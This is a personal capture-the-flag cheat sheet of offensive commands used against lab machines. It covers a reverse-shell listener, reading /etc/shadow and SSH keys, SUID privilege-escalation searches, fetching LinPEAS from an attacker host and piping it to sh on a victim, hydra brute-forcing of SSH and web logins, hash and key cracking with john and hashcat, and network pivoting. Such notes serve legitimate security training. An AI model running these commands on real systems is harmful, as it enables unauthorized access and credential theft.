## Tools
[Airmon-ng](./Tools/Airmon-ng.md)

[Nmap](./Tools/Nmap.md)

[OpenVPN](./Tools/OpenVPN.md)

## random stuff
https://gchq.github.io/CyberChef/

https://md5decrypt.net/en/

https://10015.io/tools/sha1-encrypt-decrypt

https://wigle.net/

https://www.revshells.com/

https://github.com/xnomas/TryHackMe-Writeups/tree/main/JPGchat

https://dev.to/yowise/tryhackme-chrome-post-2-90j

https://trustifi.com/url-defang-tool/

site:instagram.com intext:2mdtln

https://annas-archive.org

```bash
cat ~/.zsh_history
sudo dpkg -i
nc -lvnp 2144
sudo python3 -m http.server 80
ncat 10.10.25.140 3000
chmod +x 
cat /etc/shadow
cd ~/.ssh/ 
service bluetooth restart
sudo killall openvpn 
export IP={Machine IP}

#list connected ssh
ss -tnp | grep ':22' | grep ESTAB
```

### traceroute
```bash
┌──(mamy👻Mamy)-[~]
└─$ traceroute google.com
traceroute to google.com (172.217.17.238), 30 hops max, 60 byte packets
 1  _gateway (192.168.45.28)  110.194 ms  109.873 ms  110.321 ms
 2  172.20.10.1 (172.20.10.1)  443.538 ms  443.514 ms  443.979 ms
 3  * * *
 4  10.229.136.1 (10.229.136.1)  110.708 ms  110.914 ms  111.223 ms 
 5  * * *
 6  * * *
 7  10.229.73.50 (10.229.73.50)  351.868 ms  173.335 ms  175.461 ms
 8  10.229.73.73 (10.229.73.73)  180.328 ms  247.712 ms  246.941 ms
 9  * * *
10  34-acibadem-xrs-t2-2---34-avea-sr12e-t3-2.statik.turktelekom.com.tr (81.212.214.128)  357.811 ms  353.444 ms  354.436 ms
11  * * *
12  307-sof-col-2---34-ebgp-acibadem-sr12e-k.statik.turktelekom.com.tr (212.156.104.158)  208.870 ms  158.412 ms  159.369 ms
13  142.250.168.28 (142.250.168.28)  167.044 ms  171.266 ms 72.14.204.10 (72.14.204.10)  259.215 ms
14  * * *
15  142.250.60.30 (142.250.60.30)  263.945 ms 209.85.243.244 (209.85.243.244)  273.413 ms 142.251.227.250 (142.251.227.250)  198.286 ms
16  muc11s14-in-f14.1e100.net (172.217.17.238)  116.935 ms 209.85.242.141 (209.85.242.141)  140.760 ms 209.85.248.179 (209.85.248.179)  345.331 ms
```  

## dirb
```bash
dirb http://10.10.86.183/

```

## gobuster 
```bash 
gobuster dir -u http://10.10.13.178/ -w /usr/share/dirb/wordlists/common.txt
```
## find
```bash
find / -type f -name user.txt 2>/dev/null
```
## Privilege escalation
https://gtfobins.github.io/
```bash
find / -user root -perm /4000 2>/dev/null
```
```bash
cat /etc/passwd
```
===> LinPEAS

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

-> From github
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
-> W/ Local network

#Host
```bash
sudo python3 -m http.server 80
```
#Victim
```bash
curl 10.17.72.21/linpeas.sh | sh
```
-> or [scp](https://github.com/2mdtln/CTFNotes?tab=readme-ov-file#scp) it 

## Change Username Hostname 

https://www.youtube.com/watch?v=VM64fH6tEEU&ab_channel=RyanJohn

## hydra 
```bash
hydra -l ~Username~ -P 'list.txt' ssh://10.10.65.127
```

```bash
hydra -l admin -P '/home/mamy/Desktop/rockyou.txt' -f 10.10.222.32 http-get /labs/basic_auth/    
```
```bash
hydra -l admin -P /home/mamy/Desktop/rockyou.txt 10.10.115.52 http-post-form "/admin/:user=admin&pass=^PASS^:F=Username or password invalid" -vV 
```
```bash
hydra -l John -P /home/mamy/Desktop/rockyou.txt 10.10.56.31 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password" -s 62337
```

## Find id-rsa passphrase
```bash
zssh2john '/home/kali/Desktop/id_rsa' > ToJohn.txt
```
```bash
john 'ToJohn.txt' --wordlist='/home/kali/Desktop/rockyou.txt' 
```
## enum4linux (Userrames) (too slow)
```bash
enum4linux 10.10.130.7
```
## binwalk
```bash
binwalk /home/kali/Desktop/cutie.png      

DECIMAL       HEXADECIMAL     DESCRIPTION
.--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
```bash
binwalk -e /home/kali/Desktop/cutie.png  

DECIMAL       HEXADECIMAL     DESCRIPTION
.--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
## steghide
```bash
steghide extract -sf /home/mamy/Desktop/useless/white_rabbit_1.jpg 

 Enter passphrase: 
 wrote extracted data to "hint.txt".  
``` 
## hashcat
```bash
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt

hashcat -m 0 -a 0 hash.txt '/home/kali/Desktop/rockyou.txt'
```
## John
```bash
sudo ssh2john "/home/mamy/Desktop/useless/id_rsa (copy 1)" > HashForJohn.txt
``` 
```bash                                             
john /home/mamy/Desktop/HashForJohn.txt --wordlist='/home/mamy/Desktop/rockyou.txt'

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (/home/mamy/Desktop/useless/id_rsa (copy 1))     
1g 0:00:00:00 DONE (2024-08-02 16:26) 3.703g/s 49540p/s 49540c/s 49540C/s 100588..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## scp
```bash
sudo scp -i id_rsa chisel root@10.200.52.200:/root
```
```bash
sudo scp <user@machineip>:(file name) /home/kali/Desktop
```
![alt text](/assets/image.png)

## xfreerdp 
```bash
xfreerdp /v:10.200.52.150 /u:Mamyy /p:123455
```
## sshuttle(vpn to ssh)
```bash
sudo sshuttle -NHr root@10.200.52.200 --ssh-cmd 'ssh -i id_rsa' 10.200.52.0/24 -x 10.200.52.200
c : Connected to server.
```
## crunch
```bash
crunch 3 3 -o otp.txt -t %%% -s 100 -e 200 
```

